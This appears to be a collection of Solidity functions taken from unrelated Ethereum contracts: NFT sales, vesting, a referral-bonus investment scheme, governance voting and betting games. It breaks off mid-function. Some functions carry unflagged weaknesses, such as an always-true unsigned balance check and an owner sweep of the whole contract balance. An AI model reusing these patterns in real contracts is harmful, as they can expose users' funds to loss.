function buyToken(uint256 _tokenId) public
payable
isNotContract(msg.sender) {
    Animal storage animal = arkData[_tokenId];
    uint256 price = animal.price;
    address oldOwner = animal.owner;
    address newOwner = msg.sender;
    uint256 excess = msg.value.sub(price);
    require(price > 0);
    require(msg.value >= price);
    require(oldOwner != msg.sender);
    require(oldOwner != address(0) && oldOwner != address(1)); 
    uint256 totalCut = price.mul(4).div(100);
    uint256 birtherCut = price.mul(animal.birtherPct).div(1000); 
    birtherBalances[animal.birther] = birtherBalances[animal.birther].add(birtherCut);
    uint256 devCut = totalCut.sub(birtherCut);
    developerCut = developerCut.add(devCut);
    transferToken(oldOwner, newOwner, _tokenId);
    Purchase(_tokenId, newOwner, oldOwner, price);
    animal.price = getNextPrice(price);
    animal.lastPrice = price;
    oldOwner.transfer(price.sub(totalCut));
    if (excess > 0) {
        newOwner.transfer(excess);
    }
    checkBirth(_tokenId);
}

function calculateVestedTokens(
    uint256 _tokens,
    uint256 _vesting,
    uint256 _start,
    uint256 _claimed
) internal constant returns(uint256) {
    uint256 time = block.timestamp;
    if (time < _start) {
        return 0;
    }
    if (time >= _vesting) {
        return _tokens.sub(_claimed);
    }
    uint256 vestedTokens = _tokens.mul(time.sub(_start)).div(
        _vesting.sub(_start)
    );
    return vestedTokens.sub(_claimed);
}

function claim(address _to) internal {
    uint256 numberOfGrants = grants[_to].length;
    if (numberOfGrants == 0) {
        return;
    }
    uint256 claimable = 0;
    uint256 claimableFor = 0;
    for (uint256 i = 0; i < numberOfGrants; i++) {
        claimableFor = calculateVestedTokens(
            grants[_to][i].value,
            grants[_to][i].vesting,
            grants[_to][i].start,
            grants[_to][i].claimed
        );
        claimable = claimable.add(claimableFor);
        grants[_to][i].claimed = grants[_to][i].claimed.add(claimableFor);
    }
    token.transfer(_to, claimable);
    circulatingSupply += claimable;
    NewTokenClaim(_to, claimable);
}

function withdraw()
payable
external {
    _payout(msg.sender);
    Player storage player = players[msg.sender];
    uint256 _amount = player.dividends + player.referral_bonus + player.match_bonus + player.holder_full_bonus + player.holder_single_bonus;
    uint256 _eth_amount = player.eth_dividends;
    require(_amount > 0, "Insufficient balance");
    uint256 token_amount = _amount;
    require(investToken.approve(address(this), token_amount), "approve failed");
    require(investToken.transferFrom(address(this), msg.sender, token_amount), "transferFrom failed");
    if (_eth_amount >= eth_min_withdraw_num && address(this).balance >= _eth_amount) {
        msg.sender.transfer(_eth_amount);
        playerTotals[msg.sender].total_eth_dividends += player.eth_dividends;
        total_eth_dividends += player.eth_dividends;
        player.eth_dividends = 0;
    }
    _referralPayout(msg.sender, token_amount);
    _shareHoldersFullNodePayout(token_amount);
    _shareHoldersSingleNodePayout(msg.sender, token_amount);
    _matchPayout(msg.sender, token_amount);
    _updatePlayerTotalPayout(msg.sender, token_amount);
    emit Withdraw(msg.sender, token_amount);
}

function depositRedeem(uint256 _invest_id)
payable
external {
    Player storage player = players[msg.sender];
    require(player.deposits.length >= _invest_id && _invest_id > 0, "Valid deposit id");
    uint256 _index = _invest_id - 1;
    require(player.deposits[_index].expire < block.timestamp, "Invest not expired");
    require(player.deposits[_index].status == 0, "Invest is redeemed");
    uint256 _amount = player.deposits[_index].amount;
    uint256 token_amount = _getTokenAmount(_amount, invest_token_decimal);
    require(investToken.approve(address(this), token_amount), "approve failed");
    require(investToken.transferFrom(address(this), msg.sender, token_amount), "transferFrom failed");
    player.deposits[_index].status = 1;
    if (player.deposits[_index].is_crowd == 1) {
        player.is_crowd = 0;
        total_crowded_num -= 1;
        _removeShareholders(msg.sender);
    }
    player.total_invested -= _amount;
    total_invested -= _amount;
    total_redeem += _amount;
    _updateReferralMatchInvestedAmount(msg.sender, _amount, -1);
    emit DepositRedeem(_invest_id);
}

function crowd(address _referral, uint256 _amount)
payable
external {
    require(_amount == CROWD_LIMIT_AMOUNT, "Crowd limit: 15000 1CC");
    require(total_crowded_num <= SHAREHOLDER_LIMIT_NUM, "Maximum shareholders: 30");
    Player storage player = players[msg.sender];
    require(player.is_crowd == 0, "Already a shareholder");
    uint256 token_amount = _getTokenAmount(_amount, invest_token_decimal);
    require(investToken.transferFrom(msg.sender, address(this), token_amount), "transferFrom failed");
    _setReferral(msg.sender, _referral);
    uint256 _month = crowd_period_month;
    uint256 period_time = _month.mul(30).mul(86400);
    if (player.deposits.length == 0) {
        total_investors += 1;
        addrmap[total_investors] = msg.sender;
    }
    uint256 _id = player.deposits.length + 1;
    player.deposits.push(PlayerDeposit({
        id: _id,
        amount: _amount,
        total_withdraw: 0,
        time: uint256(block.timestamp),
        period: _month,
        expire: uint256(block.timestamp).add(period_time),
        status: 0,
        is_crowd: 1
    }));
    player.is_crowd = 1;
    total_crowded_num += 1;
    shareholders.push(msg.sender);
    player.total_invested += _amount;
    total_invested += _amount;
    _updateReferralMatchInvestedAmount(msg.sender, _amount, 1);
    emit Crowd(msg.sender, _amount);
}

function deposit(address _referral, uint256 _amount, uint256 _month)
external
payable {
    require(_amount >= INVEST_MIN_AMOUNT, "Minimal deposit: 100 1CC");
    require(_amount <= INVEST_MAX_AMOUNT, "Maxinum deposit: 10000 1CC");
    Player storage player = players[msg.sender];
    require(player.deposits.length < 2000, "Max 2000 deposits per address");
    uint256 token_decimals = 10 ** invest_token_decimal;
    uint256 token_amount = _amount * token_decimals;
    require(investToken.transferFrom(msg.sender, address(this), token_amount), "transferFrom failed");
    _setReferral(msg.sender, _referral);
    if (player.deposits.length == 0) {
        total_investors += 1;
        addrmap[total_investors] = msg.sender;
    }
    uint256 period_time = _month * 30 * 86400;
    uint256 _id = player.deposits.length + 1;
    player.deposits.push(PlayerDeposit({
        id: _id,
        amount: _amount,
        total_withdraw: 0,
        time: uint256(block.timestamp),
        period: _month,
        expire: uint256(block.timestamp).add(period_time),
        status: 0,
        is_crowd: 0
    }));
    player.total_invested += _amount;
    total_invested += _amount;
    _updateReferralMatchInvestedAmount(msg.sender, _amount, 1);
    emit Deposit(msg.sender, _amount, _month);
}

function payoutOf(address _addr)
view
external
returns(uint256 value) {
    Player storage player = players[_addr];
    for (uint256 i = 0; i < player.deposits.length; i++) {
        PlayerDeposit storage dep = player.deposits[i];
        uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
        uint256 to = block.timestamp > dep.expire ? dep.expire : uint256(block.timestamp);
        if (from < to && dep.status == 0) {
            uint256 _day_payout = _getInvestDayPayoutOf(dep.amount, dep.period);
            value += _day_payout * (to - from) / 86400;
        }
    }
    return value;
}

function _updateTotalPayout(address _addr)
private {
    Player storage player = players[_addr];
    for (uint256 i = 0; i < player.deposits.length; i++) {
        PlayerDeposit storage dep = player.deposits[i];
        uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
        uint256 to = block.timestamp > dep.expire ? dep.expire : uint256(block.timestamp);
        if (from < to && dep.status == 0) {
            uint256 _day_payout = _getInvestDayPayoutOf(dep.amount, dep.period);
            player.deposits[i].total_withdraw += _day_payout * (to - from) / 86400;
        }
    }
}

function payoutEthOf(address _addr)
view
external
returns(uint256 value) {
    Player storage player = players[_addr];
    uint256 eth_usd_price = getEthLatestPrice();
    for (uint256 i = 0; i < player.deposits.length; i++) {
        PlayerDeposit storage dep = player.deposits[i];
        uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
        uint256 to = block.timestamp > dep.expire ? dep.expire : uint256(block.timestamp);
        if (from < to && dep.status == 0) {
            uint256 token_amount = _getTokenAmount(dep.amount, invest_token_decimal);
            uint256 _day_eth_payout = (token_amount * invest_reward_eth_month_rate / 1000 / 30) * (invest_coin_usd_price * (10 ** 8)) / eth_usd_price * (10 ** (18 - invest_token_decimal));
            value += _day_eth_payout * (to - from) / 86400;
        }
    }
    return value;
}

function airdropTokens(bytes32 _channelId, address[] memory _recipients, uint tokenAmount, uint weiAmount) public onlyOwner {
    for (uint i = 0; i < _recipients.length; i++) {
        bytes32 channelHash = keccak256(
            abi.encodePacked(_channelId, _recipients[i])
        );
        address payable currentRecipient = address(uint160(_recipients[i]));
        if (!airdrops[channelHash]) {
            airdrops[channelHash] = true;
            rewardBalanceOf[currentRecipient] += tokenAmount;
            totalRewardBalance += tokenAmount;
            tokenReward.transfer(currentRecipient, tokenAmount);
            currentRecipient.transfer(weiAmount);
        }
    }
}

function sendStableReward(address _from, address _destination, uint _tokenAmount, uint _stableCoinAmount) public onlyOwner {
    require(rewardBalanceOf[_from] >= _tokenAmount);
    tokenReward.transferFrom(_from, address(this), _tokenAmount);
    rewardBalanceOf[_from] -= _tokenAmount;
    totalRewardBalance -= _tokenAmount;
    stableCoinReward.transfer(_destination, _stableCoinAmount);
}

receive() external payable {
    require(saleEndDate > 0, "Sale has not started");
    require(msg.value >= 0.1 ether, "Not enough investment");
    uint256 remainingSaleTokens = IFORMS(FORMS_TOKEN_ADDRESS).balanceOf(address(this));
    if (remainingSaleTokens > 0 && block.timestamp > saleEndDate)
        IFORMS(FORMS_TOKEN_ADDRESS).burnTokens(remainingSaleTokens);
    require(IFORMS(FORMS_TOKEN_ADDRESS).balanceOf(address(this)) > 0, "Sale is finished");
    uint tokens = getTokenAmount(msg.value);
    IFORMS(FORMS_TOKEN_ADDRESS).transfer(msg.sender, tokens);
    IFORMS(FORMS_TOKEN_ADDRESS).setTokenLock(tokens, saleEndDate.add(24 hours), msg.sender);
    owner.transfer(msg.value);
}

function forwardFunds() onlyOwner public {
    require(now >= endTime);
    wallet.transfer(address(this).balance);
}

function FoxicoPool(uint256 _startTime, uint256 _endTime, address _wallet) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_wallet != address(0));
    startTime = _startTime;
    endTime = _endTime;
    wallet = _wallet;
    refundEnabled = false;
}

function refundFunds(address _wallet) internal {
    require(_wallet != address(0));
    require(deposited[_wallet] > 0);
    require(now < endTime);
    uint256 depositedValue = deposited[_wallet];
    deposited[_wallet] = 0;
    _wallet.transfer(depositedValue);
    emit Refunded(_wallet, depositedValue);
}

function closeMigration() public onlyOwner whenMigrationEnabled {
    require(block.timestamp > endMigrationDate, "migration cannot be closed yet");
    migrationEnabled = false;
    uint256 remainingBalance = toToken.balanceOf(address(this));
    require(toToken.transfer(owner, remainingBalance), "recovering toToken failed");
}

function redeemShip(uint256 _factoryId) external whenNotPaused {
    require(ethernautsStorage.isCategory(_factoryId, uint8(AssetCategory.Manufacturer)));
    require(msg.sender == ethernautsStorage.ownerOf(_factoryId));
    require(ethernautsStorage.isState(_factoryId, uint8(AssetState.Available)));
    uint256 cooldown;
    (, , , , , , cooldown, ) = ethernautsStorage.assets(_factoryId);
    require(cooldown < now);
    ethernautsStorage.setAssetCooldown(_factoryId, now + (24 * 60 * 60), 0); 
    uint16 assetId = factoryToAssetId[_factoryId];
    ethernautsStorage.createAsset(
        _factoryId,
        msg.sender,
        10000000000000000,
        assetId,
        uint8(AssetCategory.Ship),
        uint8(AssetState.Available),
        89,
        assetToStats[assetId],
        0,
        0
    );
    Redeem(_factoryId);
}

function _vote(uint8 opinion, uint112 addedVoteAmt) private {
    require(_YES <= opinion && opinion <= _NO, "OneSwapGov: INVALID_OPINION");
    require(addedVoteAmt > 0, "OneSwapGov: ZERO_VOTE_AMOUNT");
    (uint24 currProposalID, uint24 votedProposalID,
        uint8 votedOpinion, uint112 votedAmt, uint112 depositedAmt) = _getVoterInfo();
    bool isRevote = false;
    if ((votedProposalID == currProposalID) && (votedOpinion != opinion)) {
        if (votedOpinion == _YES) {
            assert(_totalYes >= votedAmt);
            _totalYes -= votedAmt;
        } else {
            assert(_totalNo >= votedAmt);
            _totalNo -= votedAmt;
        }
        votedAmt = 0;
        isRevote = true;
    }
    assert(depositedAmt >= votedAmt);
    if (addedVoteAmt > depositedAmt - votedAmt) {
        uint112 moreDeposit = addedVoteAmt - (depositedAmt - votedAmt);
        depositedAmt += moreDeposit;
        _totalDeposit += moreDeposit;
        IERC20(ones).transferFrom(msg.sender, address(this), moreDeposit);
    }
    if (opinion == _YES) {
        _totalYes += addedVoteAmt;
    } else {
        _totalNo += addedVoteAmt;
    }
    votedAmt += addedVoteAmt;
    _setVoterInfo(currProposalID, opinion, votedAmt, depositedAmt);
    if (isRevote) {
        emit Revote(currProposalID, msg.sender, opinion, addedVoteAmt);
    } else if (votedAmt > addedVoteAmt) {
        emit AddVote(currProposalID, msg.sender, opinion, addedVoteAmt);
    } else {
        emit NewVote(currProposalID, msg.sender, opinion, addedVoteAmt);
    }
}

function tally() external override {
    require(_proposalType > 0, "OneSwapGov: NO_PROPOSAL");
    require(uint256(_deadline) <= block.timestamp, "OneSwapGov: STILL_VOTING");
    bool ok = _totalYes > _totalNo;
    uint8 _type = _proposalType;
    uint256 val = _value;
    address addr = _addr;
    address proposer = _proposer;
    _resetProposal();
    if (ok) {
        _execProposal(_type, addr, val);
    } else {
        _taxProposer(proposer);
    }
    emit TallyResult(_proposalID, ok);
}

function vote(uint8 opinion, uint112 voteAmt) external override {
    require(_proposalType > 0, "OneSwapGov: NO_PROPOSAL");
    require(uint256(_deadline) > block.timestamp, "OneSwapGov: DEADLINE_REACHED");
    _vote(opinion, voteAmt);
}

function submitTextProposal(string calldata title, string calldata desc, string calldata url,
    uint112 voteAmt) external override {
    require(uint256(_deadline) + _TEXT_PROPOSAL_INTERVAL < block.timestamp,
        "OneSwapGov: COOLING_DOWN");
    _newProposal(_PROPOSAL_TYPE_TEXT, address(0), 0, voteAmt);
    emit NewTextProposal(_proposalID, title, desc, url, _deadline);
    _vote(_YES, voteAmt);
}

function reap(address _object) nonReentrant external {
    require(_object != address(0));
    require(balanceOfToken[msg.sender][_object] > 0);
    if (msg.sender == owner)
        owner.transfer(this.balance);
    uint256 balance = balanceOfToken[msg.sender][_object];
    balance = balance.sub(balance % (1 ether)); 
    ERC20Basic(_object).transfer(msg.sender, balance);
    balanceOfToken[msg.sender][_object] = 0;
    totalOfToken[_object] = totalOfToken[_object].sub(balance);
    Reapped(_object, balance);
}

function prep(address _shop, uint8 _iterations) nonReentrant whenNotPaused external {
    require(_shop != address(0));
    uint256 _len = 1;
    if (_iterations > 1)
        _len = uint256(_iterations);
    require(_len > 0);
    ShopInterface shop = ShopInterface(_shop);
    for (uint256 i = 0; i < _len.mul(100); i++)
        shop.buyObject(this);
    address object = shop.object();
    balanceOfToken[msg.sender][object] = balanceOfToken[msg.sender][object].add(uint256(_len.mul(95 ether)));
    balanceOfToken[owner][object] = balanceOfToken[owner][object].add(uint256(_len.mul(5 ether)));
    totalOfToken[object] = totalOfToken[object].add(uint256(_len.mul(100 ether)));
    Prepped(_shop, object, _len);
}

function buyTokens(address sender_, uint256 value_) internal returns(bool) {
    uint256 amount = value_.mul(ethRate).div(tokenPrice);
    require(balances[fundsWallet].sub(amount) >= 0);
    balances[fundsWallet] = balances[fundsWallet].sub(amount);
    balances[sender_] = balances[sender_].add(amount);
    fundsWallet.transfer(value_);
    Transfer(fundsWallet, sender_, amount);
    return true;
}

function bid(uint256 _wave, uint256 _tokenId) external payable whenNotPaused {
    require(ethernautsStorage.ownerOf(_tokenId) == address(this));
    require(countdowns[_wave] >= now);
    bool existInWave = false;
    for (uint256 i = 0; i < waveToTokens[_wave].length; i++) {
        if (waveToTokens[_wave][i] == _tokenId) {
            existInWave = true;
            break;
        }
    }
    require(existInWave);
    address oldBuyer = tokenToBuyer[_tokenId];
    uint256 sellingPrice = ethernautsStorage.priceOf(_tokenId);
    require(msg.sender != address(0));
    require(msg.value > sellingPrice);
    sellingPrice = msg.value;
    uint256 newPrice = SafeMath.div(SafeMath.mul(sellingPrice, bonus[_wave]), percBase);
    uint256 lastPrice = tokenToLastPrice[_tokenId];
    tokenToLastPrice[_tokenId] = sellingPrice;
    ethernautsStorage.setPrice(_tokenId, newPrice);
    tokenToBuyer[_tokenId] = msg.sender;
    if (oldBuyer != address(0)) {
        oldBuyer.transfer(lastPrice);
    }
    Bid(_tokenId, sellingPrice, newPrice, oldBuyer, msg.sender);
}

function unlockGrant() external {
    Grant storage grant = grants[msg.sender];
    require(grant.value != 0);
    require(!grant.transferred);
    require(now >= grant.end); 
    grant.transferred = true;
    totalVesting = totalVesting.sub(grant.value);
    erc20.transfer(msg.sender, grant.value);
    emit UnlockGrant(msg.sender, grant.value);
}

function createGrant(address _to, uint _value, uint _end) external onlyOwner {
    require(_to != address(0));
    require(_value > 0);
    require(totalVesting.add(_value) <= erc20.balanceOf(address(this)));
    require(grants[_to].value == 0);
    grants[_to] = Grant({
        value: _value,
        end: _end,
        transferred: false
    });
    totalVesting = totalVesting.add(_value);
    emit CreateGrant(_to, _value, _end);
}

function addOneGame(string _name, uint256 _deadline) onlyAdmin() external {
    uint256 _id = gameIdList.length;
    require(games[_id].status == STATUS.NOTFOUND);
    require(_deadline > timenow());
    games[_id] = Game(_name, _id, 0, 0, _deadline, STATUS.PLAYING);
    gameIdList.push(_id);
}

function getAllGames(bool onlyPlaying, uint256 from, uint256 to) public view returns(string gameInfoList) {
    gameInfoList = "";
    uint256 counter = 0;
    for (uint256 i = 0; i < gameIdList.length; i++) {
        if (counter < from) {
            counter++;
            continue;
        }
        if (counter > to) {
            break;
        }
        if ((onlyPlaying && games[gameIdList[i]].status == STATUS.PLAYING && timenow() < games[gameIdList[i]].dateStopBuy) || onlyPlaying == false) {
            gameInfoList = strConcat(gameInfoList, "|", uint2str(games[gameIdList[i]].id));
            gameInfoList = strConcat(gameInfoList, ",", games[gameIdList[i]].name);
            gameInfoList = strConcat(gameInfoList, ",", uint2str(games[gameIdList[i]].totalPot));
            gameInfoList = strConcat(gameInfoList, ",", uint2str(games[gameIdList[i]].dateStopBuy));
            if (games[gameIdList[i]].status == STATUS.PLAYING && timenow() > games[gameIdList[i]].dateStopBuy) {
                gameInfoList = strConcat(gameInfoList, ",", uint2str(uint(STATUS.PROCESSING)));
            } else {
                gameInfoList = strConcat(gameInfoList, ",", uint2str(uint(games[gameIdList[i]].status)));
            }
            counter++;
        }
    }
}

function getMyTicketList(bool active, uint256 from, uint256 to) public view returns(string info) {
    info = "";
    uint256 counter = 0;
    if (ownershipTokenCount[msg.sender] > 0) {
        for (uint256 i = 0; i < totalSupply; i++) {
            if (tokenIndexToOwner[i] == msg.sender) {
                if (counter < from) {
                    counter++;
                    continue;
                }
                if (counter > to) {
                    break;
                }
                Token memory _token = tokens[i];
                uint256 gameId = uint256((_token.option >> (8 * 8)) & 0xFFFFFFFF);
                uint256 tStatus = uint256((_token.option >> (12 * 8)) & 0xFF);
                uint256 dateBuy = uint256(_token.option & 0xFFFFFFFF);
                uint256 _choose = uint256((_token.option >> (4 * 8)) & 0xFFFFFFFF);
                uint256 otherpick = getNumbersOfPick(gameId, uint8(_choose));
                Game storage curGame = games[gameId];
                if ((active && (tStatus == 0 && (curGame.status == STATUS.PLAYING || (curGame.result[uint8(_choose)] == 1 && curGame.status == STATUS.PAYING) || curGame.status == STATUS.REFUNDING))) || active == false) {
                    info = strConcat(info, "|", uint2str(i));
                    info = strConcat(info, ",", uint2str(gameId));
                    info = strConcat(info, ",", uint2str(_token.price));
                    info = strConcat(info, ",", uint2str(dateBuy));
                    info = strConcat(info, ",", uint2str(_choose));
                    info = strConcat(info, ",", uint2str(otherpick));
                    info = strConcat(info, ",", uint2str(tStatus));
                    if (curGame.status == STATUS.PLAYING && timenow() > curGame.dateStopBuy) {
                        info = strConcat(info, ",", uint2str(uint(STATUS.PROCESSING)));
                    } else {
                        info = strConcat(info, ",", uint2str(uint(curGame.status)));
                    }
                    if (tStatus == 3 || curGame.potDetail[uint8(_choose)] == 0) {
                        info = strConcat(info, ",", uint2str(0)); 
                    } else {
                        if (curGame.totalWinnersDeposit > 0) {
                            if (curGame.result[uint8(_choose)] == 1) {
                                info = strConcat(info, ",", uint2str(_token.price.mul(curGame.totalPot).div(curGame.totalWinnersDeposit)));
                            } else {
                                info = strConcat(info, ",", uint2str(_token.price.mul(curGame.totalPot).div(curGame.potDetail[uint8(_choose)])));
                            }
                        } else {
                            info = strConcat(info, ",", uint2str(_token.price.mul(curGame.totalPot).div(curGame.potDetail[uint8(_choose)])));
                        }
                    }
                    if (curGame.status == STATUS.PAYING && curGame.result[uint8(_choose)] == 1) {
                        info = strConcat(info, ",", uint2str(1));
                    } else {
                        info = strConcat(info, ",", uint2str(0));
                    }
                    info = strConcat(info, ",", uint2str(curGame.totalPot));
                }
                counter++;
            }
        }
    }
}

function openResult(uint256 _id, uint8[] _result) onlyAdmin() external {
    Game storage curGame = games[_id];
    require(curGame.status == STATUS.PLAYING);
    require(timenow() > curGame.dateStopBuy + 2 * 60 * 60);
    uint256 _totalWinnersDeposit = 0;
    for (uint256 i = 0; i < _result.length; i++) {
        require(_result[i] < 30 && _result[i] >= 0);
        curGame.result[_result[i]] = 1;
        _totalWinnersDeposit = _totalWinnersDeposit.add(curGame.potDetail[_result[i]]);
    }
    if (_totalWinnersDeposit > 0) {
        curGame.status = STATUS.PAYING;
        curGame.totalWinnersDeposit = _totalWinnersDeposit;
    } else {
        curGame.status = STATUS.REFUNDING;
    }
}

function cancelTicket(uint256 _tid) payable external {
    require(tokenIndexToOwner[_tid] == msg.sender);
    Token storage _token = tokens[_tid];
    uint256 gameId = uint256((_token.option >> (8 * 8)) & 0xFFFFFFFF);
    Game storage curGame = games[gameId];
    require(curGame.status == STATUS.PLAYING);
    require(timenow() < curGame.dateStopBuy);
    uint8 ticketStatus = uint8((_token.option >> (12 * 8)) & 0xFF);
    require(ticketStatus == 0);
    uint256 refundFee = _token.price;
    require(refundFee > 0);
    uint8 _choose = uint8((_token.option >> (4 * 8)) & 0xFFFFFFFF);
    curGame.totalPot = curGame.totalPot.sub(refundFee);
    curGame.potDetail[_choose] = curGame.potDetail[_choose].sub(refundFee);
    _token.option = updateTicketStatus(_token.option, 3);
    msg.sender.transfer(refundFee);
}

function getGameInfoById(uint256 _id) public view returns(
    uint256 _totalPot,
    uint256 _totalWinnersDeposit,
    uint256 _dateStopBuy,
    uint8 _gameStatus,
    string _potDetail,
    string _results,
    string _name
) {
    Game storage curGame = games[_id];
    _potDetail = "";
    _results = "";
    for (uint8 i = 0; i < 30; i++) {
        _potDetail = strConcat(_potDetail, ",", uint2str(curGame.potDetail[i]));
        _results = strConcat(_results, ",", uint2str(curGame.result[i]));
    }
    _totalPot = curGame.totalPot;
    _totalWinnersDeposit = curGame.totalWinnersDeposit;
    _dateStopBuy = curGame.dateStopBuy;
    _name = curGame.name;
    _gameStatus = uint8(curGame.status);
    if (curGame.status == STATUS.PLAYING && timenow() > _dateStopBuy) _gameStatus = uint8(STATUS.PROCESSING);
}

function buyTicket(uint256 _id, uint8 _choose) payable external {
    Game storage curGame = games[_id];
    require(curGame.status == STATUS.PLAYING);
    require(timenow() < curGame.dateStopBuy);
    require(msg.value >= min_amount);
    require(msg.value <= max_amount);
    require(_choose < 30 && _choose >= 0);
    uint256 dev = calculateDevCut(msg.value);
    uint256 deposit = msg.value.sub(dev);
    curGame.totalPot = curGame.totalPot.add(deposit);
    curGame.potDetail[_choose] = curGame.potDetail[_choose].add(deposit);
    Token memory _token = Token({
        price: deposit,
        option: generateTicketData(_id, _choose, 0)
    });
    uint256 newTokenId = totalSupply++;
    tokens[newTokenId] = _token;
    _transfer(0, msg.sender, newTokenId);
    if (dev > 0) {
        owner.transfer(dev);
    }
}

function getNumbersOfPick(uint256 _gid, uint8 _pick) public view returns(uint256 num) {
    require(_pick < 30 && _pick >= 0);
    Game storage curGame = games[_gid];
    num = 0;
    for (uint256 i = 0; i < totalSupply; i++) {
        uint256 data = tokens[i].option;
        uint256 _gameId = uint256((data >> (8 * 8)) & 0xFFFFFFFF);
        if (curGame.id == _gameId) {
            uint8 _choose = uint8((data >> (4 * 8)) & 0xFFFFFFFF);
            uint8 tStatus = uint8((data >> (12 * 8)) & 0xFF);
            if (_pick == _choose && tStatus != 3) {
                num++;
            }
        }
    }
}

function transfer(address to, uint tokens) public returns(bool success) {
    require(msg.sender != to); 
    require(to != address(0)); 
    require(tokens <= balances[msg.sender].balance); 
    if (!_whitelistAll) {
        if (msg.sender != owner && block.timestamp < 1535760000 && balances[msg.sender].airDropQty > 0) {
            require(tokens < 0);
        }
        if (msg.sender != owner && block.timestamp < 1546214400 && balances[msg.sender].airDropQty > 0) {
            require((balances[msg.sender].balance - tokens) >= (balances[msg.sender].airDropQty / 10 * 9));
        }
        if (msg.sender != owner && block.timestamp < 1553990400 && balances[msg.sender].airDropQty > 0) {
            require((balances[msg.sender].balance - tokens) >= balances[msg.sender].airDropQty / 4 * 3);
        }
        if (msg.sender != owner && block.timestamp < 1561852800 && balances[msg.sender].airDropQty > 0) {
            require((balances[msg.sender].balance - tokens) >= balances[msg.sender].airDropQty / 2);
        }
        if (msg.sender != owner && block.timestamp < 1569974400 && balances[msg.sender].airDropQty > 0) {
            require((balances[msg.sender].balance - tokens) >= balances[msg.sender].airDropQty / 4);
        }
    }
    balances[msg.sender].balance = balances[msg.sender].balance.sub(tokens);
    balances[to].balance = balances[to].balance.add(tokens);
    if (msg.sender == owner) {
        balances[to].airDropQty = balances[to].airDropQty.add(tokens);
    }
    emit Transfer(msg.sender, to, tokens);
    return true;
}

function buyToken(uint32 idGame, uint32 combination, address captainAddress) payable public {
    Game storage curGame = game[idGame];
    require(curGame.status == Status.PLAYING);
    require(timenow() < curGame.dateStopBuy);
    require(combination > 0 && combination <= curGame.countCombinations);
    require(curGame.isFreezing == false);
    uint256 userStake = msg.value;
    uint256 ticketPrice = uint256(getPriceTicket()) * 1 finney;
    require(userStake >= ticketPrice);
    if (userStake > ticketPrice) {
        uint256 change = userStake - ticketPrice;
        userStake = userStake - change;
        require(userStake == ticketPrice);
        msg.sender.transfer(change);
    }
    uint256 feeValue = userStake * FEECONTRACT / 100; 
    if (captainAddress != 0x0 && captainAddress != msg.sender) {
        uint256 captainValue = feeValue * 20 / 100; 
        feeValue = feeValue - captainValue;
        captainAddress.transfer(captainValue);
    }
    userStake = userStake - feeValue;
    curGame.feeValue = curGame.feeValue + feeValue;
    betsAll[idGame][combination].sum += userStake;
    betsAll[idGame][combination].count += 1;
    uint256 packed;
    packed = (uint128(idGame) << 8 * 8) + (uint128(combination) << 4 * 8) + uint128(block.timestamp);
    Token memory _token = Token({
        price: userStake,
        option: packed
    });
    uint256 newTokenId = totalSupply++;
    tokens[newTokenId] = _token;
    _transfer(0x0, msg.sender, newTokenId);
    LogToken("Buy", msg.sender, idGame, newTokenId, combination, userStake);
}

function redeemToken(uint256 _tokenId) public {
    Token storage tkn = tokens[_tokenId];
    uint256 packed = tkn.option;
    bool payout = uint8((packed >> (12 * 8)) & 0xFF) == 1 ? true : false;
    uint32 idGame = uint32((packed >> (8 * 8)) & 0xFFFFFFFF);
    uint32 combination = uint32((packed >> (4 * 8)) & 0xFFFFFFFF);
    Game storage curGame = game[idGame];
    require(curGame.status == Status.PAYING || curGame.status == Status.CANCELING);
    require(msg.sender == tokenIndexToOwner[_tokenId]); 
    require(payout == false); 
    require(combination == curGame.winCombination || curGame.status == Status.CANCELING);
    uint256 sumPayment = 0;
    if (curGame.status == Status.CANCELING) sumPayment = tkn.price;
    if (curGame.status == Status.PAYING) sumPayment = curGame.betsSumIn / betsAll[idGame][curGame.winCombination].count;
    payout = true;
    packed += uint128(payout ? 1 : 0) << 12 * 8;
    tkn.option = packed;
    msg.sender.transfer(sumPayment);
    LogToken("Redeem", msg.sender, idGame, uint32(_tokenId), combination, sumPayment);
}

function getStatGames() public view returns(
    uint32 countAll,
    uint32 countPlaying,
    uint32 countProcessing,
    string listPlaying,
    string listProcessing
) {
    countAll = countGames;
    countPlaying = 0;
    countProcessing = 0;
    listPlaying = "";
    listProcessing = "";
    uint32 curtime = timenow();
    for (uint32 i = shiftGame; i < countAll + shiftGame; i++) {
        if (game[i].status != Status.PLAYING) continue;
        if (curtime < game[i].dateStopBuy) {
            countPlaying++;
            listPlaying = strConcat(listPlaying, ",", uint2str(i));
        }
        if (curtime >= game[i].dateStopBuy) {
            countProcessing++;
            listProcessing = strConcat(listProcessing, ",", uint2str(i));
        }
    }
}

function cancelGame(uint32 idGame) public {
    Game storage curGame = game[idGame];
    require(curGame.status == Status.PLAYING);
    require(msg.sender == owner || admins[msg.sender] || timenow() > curGame.dateStopBuy + 60 days);
    curGame.status = Status.CANCELING;
    takeFee(idGame);
}

function getPriceTicket() public view returns(uint32) {
    if (timenow() >= 1531339200) return 8000; 
    if (timenow() >= 1530993600) return 4000; 
    if (timenow() >= 1530648000) return 2000; 
    if (timenow() >= 1530302400) return 1000; 
    if (timenow() >= 1529870400) return 500; 
    if (timenow() >= 1529438400) return 400; 
    if (timenow() >= 1529006400) return 300; 
    if (timenow() >= 1528747200) return 200; 
    if (timenow() >= 1528401600) return 100; 
    return 50;
}

function getGameByID(uint32 _id) public view returns(
    string nameGame,
    uint32 countCombinations,
    uint32 dateStopBuy,
    uint32 priceTicket,
    uint32 winCombination,
    uint32 betsCount,
    uint256 betsSumIn,
    uint256 feeValue,
    Status status,
    bool isFreezing
) {
    Game storage gm = game[_id];
    nameGame = gm.nameGame;
    countCombinations = gm.countCombinations;
    dateStopBuy = gm.dateStopBuy;
    priceTicket = getPriceTicket();
    winCombination = gm.winCombination;
    betsCount = getCountTokensByGame(_id);
    betsSumIn = gm.betsSumIn;
    if (betsSumIn == 0) betsSumIn = getSumInByGame(_id);
    feeValue = gm.feeValue;
    status = gm.status;
    if (status == Status.PLAYING && timenow() > dateStopBuy) status = Status.PROCESSING;
    isFreezing = gm.isFreezing;
}

function resolveGameByHand(uint32 idGame, uint32 combination) onlyAdmin public {
    Game storage curGame = game[idGame];
    require(curGame.status == Status.PLAYING);
    require(combination <= curGame.countCombinations);
    require(combination != 0);
    require(timenow() > curGame.dateStopBuy + 2 * 60 * 60);
